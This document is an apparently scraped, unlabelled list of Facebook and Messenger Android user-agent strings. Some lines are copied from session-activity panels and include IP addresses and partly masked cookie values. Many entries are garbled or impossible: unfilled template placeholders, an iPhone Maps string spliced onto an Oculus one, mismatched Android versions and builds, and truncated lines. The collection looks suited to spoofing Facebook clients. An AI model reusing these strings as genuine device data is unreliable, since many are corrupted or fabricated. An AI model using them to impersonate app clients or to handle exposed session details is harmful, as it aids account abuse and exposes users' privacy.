22. 5. 2021 15:5Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};] Soubor cookie SryV********************
Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/Lite;FBAV/141.0.0.2.117;FBPN/com.facebook.lite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/LGE;FBBD/lge;FBDV/L-03K;FBSV/9;FBCA
Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
Dalvik/1.6.0 (Linux; U; Android 6.0; Build/MXB48T) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]
Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]
Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]
Dalvik/2.1.0 (Linux; U; Android 9; SM-A505FM Build/PPR1.180610.011) [FBAN/FB4A;FBAV/327.0.0.33.120;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/304400854;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-A505FM;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;FBRV/305275776;] FBBK/1CookieqstJ
Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/155.0.0.14.93;FBPN/com.facebook.orca;FBLC/en_US;FBBV/94098382;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;
Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/174.0.0.24.82;FBPN/com.facebook.orca;FBLC/en_US;FBBV/116802184;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;
Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-20-2) [FBAN/Orca-Android;FBAV/336.0.0.13.142;FBPN/com.facebook.orca;FBLC/es_US;FBBV/327992372;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]
Navegador Dalvik/2.1.0 (Linux; U; Android 11; SM-A115M Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/339.0.0.18.118;FBPN/com.facebook.orca;FBLC/es_US;FBBV/333752212;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A115M;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;] FBBK/1 Cookie GAuk******************** 1
Navegador SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 11; SM-A115M Build/RP1A.200720.012) [FBAN/EMA;FBBV/335423312;FBAV/279.0.0.10.118;FBDV/SM-
Dalvik/2.1.0 (Linux; U; Android 11; SM-G986U Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/316.4.0.15.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/297403762;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBDV/SM-G986U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 10; SM-A102U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/339015010;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 9; COL-L29 Build/HUAWEICOL-L29) [FBAN/Orca-Android;FBAV/314.1.0.19.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/293875204;FBCR/null;FBMF/HUAWEI;FBBD/HONOR;FBDV/COL-L29;FBSV/9;FBCA/arm64-v8a:null;FBDM/
SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]
Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/FB4A;FBAV/{7};FBPN/com.facebook.katana;FBLC/{0}_{1};FBBV/261476344;FBCR/{2};FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/&#123;&#123;density=2.625,width=1080,height=1920&#125;&#125;;FB_FW/1;FBRV/263054303;]
Dalvik/2.1.0 (Linux; U; Android 10; moto e Build/QPGS30.82-135-16) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/339015010;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto e;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1422};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 11; SM-A326U Build/RP1A.200720.012) [FBAN/FB4A;FBAV/348.0.0.39.118;FBPN/com.facebook.katana;FBLC/en_US;FBBV/338919009;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-A326U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=720,height=1465};FB_FW/1;FBRV/0;]
Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532M Build/MMB29T) [FBAN/Orca-Android;FBAV/343.0.0.8.474;FBPN/com.facebook.orca;FBLC/es_US;FBBV/344064182;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBDV/SM-G532M;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;]
com.google.Maps/6.2.0 iSL/3.3 iPhone/15.2.1 hw/iPhone13 Dalvik/2.1.0 (Linux; U; Android 10; Quest 2 Build/QQ3A.200805.001) [FBAN/OculusHorizon;FBAV/35.0.0.117.300;FBDV/Quest 2;FBCR/null;FBLC/en_US;FBSV/10;FBBD/oculus;FBBV/333880879;FBCA/arm64-v8a:;FBMF/Oculus;FBPN/com.oculus.horizon;FBVM/{&quot;912539389206240&quot;:&quot;35.0.0.145.300&quot;,&quot;1481000308606657&quot;:&quot;35.0.0.140.341&quot;,&quot;1916519981771802&quot;:&quot;18.1.0.2.46.337441587&quot;,&quot;1689311011174858&quot;:&quot;35.0.0.140.341&quot;,&quot;2141310506170802&quot;:&quot;3_4 (gzip),gzip(gfe)
Dalvik/2.1.0 (Linux; U; Android 10; Quest 2 Build/QQ3A.200805.001) [FBAN/OculusHorizon;FBAV/35.0.0.117.300;FBDV/Quest 2;FBCR/null;FBLC/en_US;FBSV/10;FBBD/oculus;FBBV/333880879;FBCA/arm64-v8a:;FBMF/Oculus;FBPN/com.oculus.horizon;FBVM/{&quot;912539389206240&quot;:&quot;35.0.0.145.300&quot;,&quot;1481000308606657&quot;:&quot;35.0.0.140.341&quot;,&quot;1916519981771802&quot;:&quot;18.1.0.2.46.337441587&quot;,&quot;1689311011174858&quot;:&quot;35.0.0.140.341&quot;,&quot;2141310506170802&quot;:&quot;3
Dalvik/2.1.0 (Linux; U; Android 9; SM-A107M Build/PPR1.180610.011) [FBAN/FB4A;FBAV/266.0.0.64.124;FBPN/com.facebook.katana;FBLC/es_US;FBBV/209629359;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A107M;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;FBRV/0;]
Created 4 Feb 2022, 14:36 Updated 7 Feb 2022, 04:59 IP address 2001:4451:24a:5f00:f579:c2c9:dc7f:a64 Browser SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 10; Infinix X688B Build/QP1A.190711.020) [FBAN/EMA;FBBV/347867921;FBAV/288.0.0.11.115;FBDV/Infinix X688B;FBLC/en_US;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=2.0}] Cookie PgTh********************
Created 3 Feb 2022, 19:48 Updated 7 Feb 2022, 04:51 IP address 119.94.71.19 Browser Dalvik/2.1.0 (Linux; U; Android 10; Infinix X688B Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/288.0.0.5.115;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/346850586;FBCR/TNT;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1472};]
Dalvik/2.1.0 (Linux; U; Android 9; LM-X420 Build/PKQ1.190302.001) [FBAN/Orca-Android;FBAV/346.0.0.7.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/348143439;FBCR/HOME;FBMF/LGE;FBBD/lge;FBDV/LM-X420;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1356};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 10; LGL355DL Build/QKQ1.200108.002) [FBAN/Orca-Android;FBAV/349.0.0.7.108;FBPN/com.facebook.orca;FBLC/en_US;FBBV/352408711;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LGL355DL;FBSV/10;
Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/Orca Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/344064014;FBCR/Movistar;FBMF/m otorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi v7a:armeabi;FBDM/{density=2.0,width=720,height=1344);FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook 14 (CB3-431) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20] Build/R99-14469.41.0) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]
Dalvik/2.1.0 (Linux; U; Android 11; moto g power (2021) Build/RZBS31.Q2-143-27-7) [FBAN/Orca-Android;FBAV/353.0.0.12.116;FBPN/com.facebook.orca;FBLC/en_US;FBBV/358361194;FBCR/cricket;FBMF/motorola;FBBD/motorola;FBDV/moto g power (2021);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1488};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 11; moto g power (2021) Build/RZBS31.Q2-143-27-7) [FBAN/Orca-Android;FBAV/352.0.0.9.116;FBPN/com.facebook.orca;FBLC/en_US;FBBV/356687955;FBCR/cricket;FBMF/motorola;FBBD/motorola;FBDV/moto g power (2021);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1488};FB_FW/1;]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G935FD Build/N2G48H) [FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_US;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]
Browser Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X505F Build/QKQ1.191224.003) [FBAN/Orca-Android;FBAV/352.0.0.9.116;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/356687941;FBCR/null;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo TB-X505F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=1.0,width=800,height=1264};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X505F Build/QKQ1.191224.003) [FBAN/Orca-Android;FBAV/352.0.0.9.116;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/356687941;FBCR/null;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo TB-X505F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=1.0,width=1280,height=784};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 11; RMX2155 Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/287.0.0.3.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/345379814;FBCR/SAZKAmobilCZ;FBMF/realme;FBBD/realme;FBDV/RMX2155;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.55,width=1080,height=2173};]
Dalvik/2.1.0 (Linux; U; Android 11; ASUS_I005DC Build/RKQ1.210303.002) [FBAN/FB4A;FBAV/336.0.0.20.117;FBPN/com.facebook.katana;FBLC/zh_TW_#Hant;FBBV/317766059;FBCR/&amp;#21488-&amp;#28771-&amp;#22823-&amp;#21733-&amp;#22823-;FBMF/asus;FBBD/asus;FBDV/ASUS_I005DC;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2322};FB_FW/1;FBRV/0;]
Dalvik/2.1.0 (Linux; U; Android 10; SM-A115M Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/319.0.0.22.170;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/301916794;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A115M;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;]
SupportsFresco=1 modular=3 Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-S7582 Build/JDQ39) [FBAN/EMA;FBBV/300742695;FBAV/257.0.0.10.171;FBDV/GT-S7582;FBLC/ar_AR;FBNG/3G;FBMNT/METERED;FBDM/{density=1.5}]
Dalvik/2.1.0 (Linux; U; Android 10; SM-T290 Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/364.0.0.10.112;FBPN/com.facebook.orca;FBLC/en_US;FBBV/374667243;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-T290;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=1.3312501,width=1280,height=736};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 8.1.0; S45B Build/OPM2.171019.012) [FBAN/EMA;FBBV/0;FBAV/26.0.0.4.133;FBDV/S45B;FBLC/id_ID;FBNG/UNKNOWN;FBMNT/UNKNOWN;FBDM/{density=1.5}]
Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]
Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;],gzip(gfe)
Dalvik/2.1.0 (Linux; U; Android 8.1.0; 5003D_EEA Build/OPM2.171019.012) [FBAN/Orca-Android;FBAV/294.0.0.24.129;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/263695251;FBCR/O2 - UK;FBMF/TCL;FBBD/TCL;FBDV/5003D_EEA;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=888};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 12; SM-G990U Build/SP1A.210812.016) [FBAN/FB4A;FBAV/375.1.0.28.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/382948769;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G990U;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2097};FB_FW/1;FBRV/0;]
Dalvik/2.1.0 (Linux; U; Android 11; 220333QAG Build/RKQ1.211001.001) [FBAN/Orca-Android;FBAV/378.0.0.25.106;FBPN/com.facebook.orca;FBLC/es_US;FBBV/397777638;FBCR/TELCEL;FBMF/Xiaomi;FBBD/Redmi;FBDV/220333QAG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1505};FB_FW/1;]
Navegador Dalvik/2.1.0 (Linux; U; Android 11; 220333QAG Build/RKQ1.211001.001) [FBAN/Orca-Android;FBAV/378.0.0.25.106;FBPN/com.facebook.orca;FBLC/es_US;FBBV/397777638;FBCR/TELCEL;FBMF/Xiaomi;FBBD/Redmi;FBDV/220333QAG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1505};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 2.3.0; vivo 1935 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/312.0.0.8.106;FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/431836095;FBCR/AXIS;FBMF/vivo;FBBD/vivo;FBDV/vivo 1935;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.29375,width=1080,height=2145};]
Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H) [FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/394408512;FBCR/Astelit-LIFE;FBMF/Asus;FBBD/Asus;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;FBRV/0;]
Dalvik/2.1.0 (Linux; U; Android 11; NAM-LX9 Build/HUAWEINAM-L29) [FBAN/Orca-Android;FBAV/370.0.0.14.108
Browser Dalvik/2.1.0 (Linux; U; Android 9; SM-G960U Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/390.2.0.29.103;FBPN/com.facebook.orca;FBLC/en_US;FBBV/429307638;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960U;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;] Cookie HyjA********************
Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/tr_TR;FBBV/243660825;FBCR/Vodafone;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/VOG-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2265};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) [FBAN/FB4A;FBAV/396.1.0.28.104;FBPN/com.facebook.katana;FBLC/tr_TR;FBBV/319214973;FBCR/Vodafone;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 8.1.0; LM-Q610.FG Build/011019) [FBAN/FB4A;FBAV/225.0.0.47.118;FBPN/com.facebook.katana;FBLC/pl_PL;FBBV/158425924;FBCR/PLAY;FBMF/LGE;FBBD/lge;FBDV/LM-Q610.FG;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;FBRV/159951317;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 11; RMX3151 Build/RP1A.200720.011) [FBAN/Orca-Android;FBAV/391.2.0.20.404;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/437533953;FBCR/Vodafone
Dalvik/2.1.0 (Linux; U; Android 7.1.1; SM-J250F Build/NMF26X) [FBAN/Orca-Android;FBAV/66.0.3774.127;FBPN/com.facebook.orca;FBLC/en_US;FBBV/854283466;FBCR/XL Axiata;FBMF/samsung;FBBD/samsung;FBDV/SM-J250F;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]
Dalvik/2.1.0 (Linux; U; Android 5; Moto Build/QP1A.244982.977) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;FBBK/1;]
Dalvik/2.1.0 (Linux; U; Android 10; M2006C3MNG MIUI/V12.0.14.0.QCSEUXM) [FBAN/Orca-Android;FBAV/396.0.0.14.82;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/446475560;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MNG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1449};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 11; 2201117SY Build/RP1A.200720.011) [FBAN/Orca-Android;FBAV/393.0.0.18.92;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/440593596;FBCR/Digi.Mobil;FBMF/Xiaomi;FBBD/Redmi;FBDV/2201117SY;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2177};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 10; moto e(7i) power Build/QOJS30.506-7-18) [FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/es_US;FBBV/458543253;FBCR/UNEFON 4G;FBMF/motorola;FBBD/motorola;FBDV/moto e(7i) power;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1472};FB_FW/1;FBRV/0;]
Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 7 MIUI/V10.3.6.0.PFGEUXM) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/182747450;FBCR/MASMOVIL;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1
Dalvik/1.6.0_(Linux;_U;_Android_4.4.4;_HTC6525LVW_Build/KTU84P)_[FBAN/Orca-Android;FBAV/18.0.0.27.14;FBLC/en_US;FBBV/5791147;FBCR/Verizon_Wireless;FBMF/HTC;FBBD/htc;FBDV/HTC6525LVW;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 6.0.1; D6503 Build/23.5.A.1.291) [FBAN/Orca-Android;FBAV/139.0.0.17.85;FBPN/com.facebook.orca;FBLC/in_ID;FBBV/74871072;FBCR/Far EasTone;FBMF/Sony;FBBD/Sony;FBDV/D6503;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 11; moto g go Build/RRHG31.Q3-37-43-43-5-4) [FBAN/FB4A;FBAV/386.0.0.35.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/402949595;FBCR/AT&amp;amp-T;FBMF/motorola;FBBD/motorola;FBDV/moto g go;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1504};FB_FW/1;FBRV/0;]
Navegador Dalvik/2.1.0 (Linux; U; Android 11; M1908C3JGG Build/RP1A.200720.011) [FBAN/FB4A;FBAV/412.0.0.22.115;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/468774204;FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1
Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/LGE;FBBD/lge;Facebook/L-03K;FBSV/9;FBCA
Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h
Dalvik/2.1.0 (Linux; U; Android 9.0; SM-A40s&#039;20&#039; Build/LMY47I) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/9.0;FBAB/com.playit.videoplayer;FBAV/2.4.9.22; FBBV/20409022;FBVS/5.9.0;FBLC/in_ID]
Dalvik/2.1.0 (Linux; U; Android 10; moto e(7) plus Build/QPZS30.30-Q3-38-69-12) [FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/es_US;FBBV/458543257;FBCR/AT&amp;amp-T;FBMF/motorola;FBBD/motorola;FBDV/moto e(7) plus;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1515};FB_FW/1;FBRV/460183955;] FBBK/1
Created May 16, 2023, 12:27 PM Updated May 19, 2023, 7:15 PM IP address 2604:ca00:130:814d::266:e712 Browser Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230505.002) [FBAN/Orca-Android;FBAV/406.0.0.13.115;FBPN/com.facebook.orca;FBLC/en_US;FBBV/470794982;FBCR/Google Fi;FBMF/Google;FBBD/google;FBDV/Pixel
iP address 2604:ca00:130:814d::266:e712 Browser Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230505.002) [FBAN/Orca-Android;FBAV/406.0.0.13.115;FBPN/com.facebook.orca;FBLC/en_US;FBBV/470794982;FBCR/Google Fi;FBMF/Google;FBBD/google;FBDV/Pixel
Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230505.002) [FBAN/Orca-Android;FBAV/406.0.0.13.115;FBPN/com.facebook.orca;FBLC/en_US;FBBV/470794982;FBCR/Google Fi;FBMF/Google;FBBD/google;FBDV/Pixel
P address 2604:ca00:130:814d::266:e712 Browser Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230505.002) [FBAN/Orca-Android;FBAV/406.0.0.13.115;FBPN/com.facebook.orca;FBLC/en_US;FBBV/470794982;FBCR/Google Fi;FBMF/Google;FBBD/google;FBDV/Pixel 6a;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2205};FB_FW/1;] FBBK/1 Cookie HBFo*
